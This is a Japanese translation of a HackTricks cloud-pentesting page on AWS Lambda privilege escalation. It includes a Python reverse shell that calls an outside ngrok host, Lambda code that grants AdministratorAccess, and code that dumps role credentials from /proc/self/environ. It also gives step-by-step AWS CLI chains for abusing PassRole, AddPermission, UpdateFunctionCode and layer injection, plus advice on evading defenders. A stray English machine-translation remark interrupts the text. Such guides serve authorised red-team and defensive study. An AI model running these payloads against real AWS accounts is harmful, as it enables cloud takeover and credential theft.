# AWS - Lambda Privesc

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>

## lambda

lambdaについての詳細はこちら:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction`, `lambda:InvokeFunction`** の権限を持つユーザーは、自分の権限を昇格させることができます。\
彼らは**新しいLambda関数を作成し、既存のIAMロールを割り当てる**ことができます。これにより、関数にそのロールに関連付けられた権限が付与されます。ユーザーはその後、**このLambda関数にコードを書いてアップロードすることができます（例えばリバースシェルを使って）**。\
関数が設定されると、ユーザーはAWS APIを通じてLambda関数を**トリガーして実行**し、意図したアクションを行うことができます。このアプローチにより、ユーザーはLambda関数を介して間接的にタスクを実行することができ、それに関連付けられたIAMロールに付与されたアクセスレベルで操作することができます。\


攻撃者はこれを悪用して**リバースシェルを取得し、トークンを盗む**ことができます:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
Since the provided text does not contain any English content to translate, there is no translation to provide. If you have specific content you would like translated, please provide the text.
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
**Lambda ロールの権限を悪用する**こともできます。\
Lambda ロールに十分な権限がある場合、それを使用して自分に管理者権限を付与することができます：
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Lambdaのロール資格情報を外部接続なしで漏洩させることも可能です。これは内部タスクに使用される**ネットワーク分離されたLambda**にとって有用です。リバースシェルをフィルタリングする未知のセキュリティグループがある場合、このコード片を使用すると、Lambdaの出力として直接資格情報を漏洩させることができます。
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**潜在的な影響：** 任意のLambdaサービスロールに直接昇格する可能性があります。

{% hint style="danger" %}
**`lambda:InvokeAsync`** が興味深いように見えるかもしれませんが、**実行するためには** `lambda:InvokeFunction` の権限も必要であることに注意してください。
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

前のシナリオと同様に、**`lambda:AddPermission`** 権限を持っている場合、**自分自身に `lambda:InvokeFunction`** 権限を付与することができます。
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**潜在的な影響：** 任意のLambdaサービスロールに直接privesc。

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`** 権限（および潜在的には `dynamodb:PutItem` と `dynamodb:CreateTable`）を持つユーザーは、`lambda:InvokeFunction` がなくても間接的に**権限をエスカレーション**することができます。\
彼らは**悪意のあるコードを持つLambda関数を作成し、既存のIAMロールを割り当てる**ことができます。

Lambdaを直接呼び出す代わりに、ユーザーは既存のDynamoDBテーブルを設定するか利用し、イベントソースマッピングを通じてLambdaにリンクします。このセットアップにより、テーブルに新しいアイテムが入力されると、Lambda関数が**自動的にトリガーされ**、ユーザーのアクションまたは別のプロセスによって間接的にLambda関数を呼び出し、渡されたIAMロールの権限でコードを実行します。
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
DynamoDBがAWS環境で既にアクティブな場合、ユーザーはLambda関数のために**イベントソースマッピングを確立する必要があります**。しかし、DynamoDBが使用されていない場合、ユーザーはストリーミングが有効な**新しいテーブルを作成する必要があります**：
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
現在、**イベントソースマッピングを作成する**ことで**Lambda関数をDynamoDBテーブルに接続する**ことが可能です：
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda関数がDynamoDBストリームにリンクされている場合、攻撃者は**DynamoDBストリームをアクティブ化することでLambdaを間接的にトリガーする**ことができます。これは、DynamoDBテーブルに**アイテムを挿入する**ことで達成できます：
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**潜在的な影響：** 指定されたlambdaサービスロールへの直接の権限昇格。

### `lambda:AddPermission`

この権限を持つ攻撃者は、**自分自身（または他者）に任意の権限を付与することができます**（これにより、リソースへのアクセスを許可するリソースベースのポリシーが生成されます）：

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**潜在的影響：** Lambdaサービスロールに直接昇格し、コードを変更して実行する権限を付与します。

### `lambda:AddLayerVersionPermission`

この権限を持つ攻撃者は、**自分自身（または他人）に`lambda:GetLayerVersion`の権限を付与**することができます。攻撃者はレイヤーにアクセスし、脆弱性や機密情報を探すことができます。

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**潜在的影響：** 機密情報へのアクセスの可能性。

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** 権限を持つユーザーは、**IAMロールにリンクされている既存のLambda関数のコードを変更する可能性があります。**\
攻撃者は、**IAMクレデンシャルを抜き出すためにLambdaのコードを変更することができます。**

攻撃者が直接関数を呼び出す能力を持っていなくても、Lambda関数が既に存在しており稼働している場合、既存のワークフローやイベントを通じて間接的にトリガーされる可能性が高いため、変更されたコードの実行が間接的に容易になります。

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**潜在的影響：** Lambda サービスロールへの直接の権限昇格。

### `lambda:UpdateFunctionConfiguration`

#### はじめに

[**Lambda レイヤー**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) は、コードを Lambda 関数に含めることを可能にしますが、**別々に保存することで**、関数コードを小さく保ち、**複数の関数がコードを共有できます**。

Lambda 内で、Python コードがどのパスからロードされるかを以下のような関数で確認できます：
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
これらが場所です：

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

例えば、ライブラリ boto3 は `/var/runtime/boto3`（4番目の位置）から読み込まれます。

#### 悪用

**関数にレイヤーをアタッチする**には、`lambda:UpdateFunctionConfiguration` 権限のみが必要であり、**レイヤーはアカウント間で共有可能**です。また、正しくオーバーライドするためには、**どのライブラリを使用しているか**を知る必要がありますが、この例では、攻撃された関数が boto3 をインポートしていると**仮定します**。

念のため、ターゲット関数で問題が発生する可能性のある異なる点がないように、ターゲットしている Lambda ランタイム（Python 3.7）で使用されている boto3 ライブラリの同じバージョンを Pip を使用してインストールします。現在、そのランタイムは boto3 バージョン 1.9.42 を使用しています。

以下のコードを使用して、boto3 バージョン 1.9.42 とその依存関係をローカルの "lambda\_layer" フォルダにインストールします：
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
次に、`/lambda_layer/boto3/__init__.py` を開き、悪意のあるコードを追加します。追加するペイロードは以下のようになります：

![](<../../../.gitbook/assets/image (26).png>)

`requests` は `botocore` からインポートされています。この関数は環境変数を抜き取ります。try-except と 0.1 秒のタイムアウトは、このコードが何も壊さないようにするためにあります。

{% hint style="info" %}
**重要な注意:** 実際のペネトレーションテストでは `from botocore.vendored import requests` を使用しないでください。なぜなら、その関数の CloudWatch ログに「DeprecationWarning」が表示され、防御者によって発見される可能性が高くなるからです。
{% endhint %}

このコードを **ZIP ファイル** にまとめて、**攻撃者アカウントの新しい Lambda レイヤーにアップロード** します。まず「python」フォルダを作成し、そこにライブラリを入れてから Lambda にアップロードすると、「/opt/python/boto3」でコードが見つかるようにします。また、レイヤーが Python 3.7 と互換性があり、**レイヤーがターゲット関数と同じリージョンにある**ことを確認してください。それが完了したら、`lambda:AddLayerVersionPermission` を使用して **レイヤーを公開アクセス可能にし**、ターゲットアカウントがそれを使用できるようにします。この API 呼び出しには個人の AWS 資格情報を使用してください。
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
次に、**侵害された資格情報**を使用して、ターゲットのLambda関数「s3-getter」に対して以下のコマンドを実行し、**クロスアカウントLambdaレイヤーをアタッチ**します。
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
次のステップは、自分たちで**関数を呼び出す**ことができる場合はそれを行うか、通常の手段によって**呼び出されるまで待つ**ことです。これはより安全な方法です。

この脆弱性を**より慎重に悪用する方法**は以下にあります：

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**潜在的な影響：** Lambdaサービスロールへの直接の権限昇格。

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

これらの権限があれば、関数を作成してURLを呼び出して実行することができるかもしれませんが、テストする方法を見つけることができませんでしたので、もしあなたができたら教えてください！

### Lambda MitM

一部のLambdaは、**ユーザーからのパラメーターに機密情報を受け取る**ことになります。もしRCEを手に入れたら、他のユーザーが送信している情報を抜き取ることができます。以下で確認してください：

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## 参考文献

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの**会社を広告したい、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
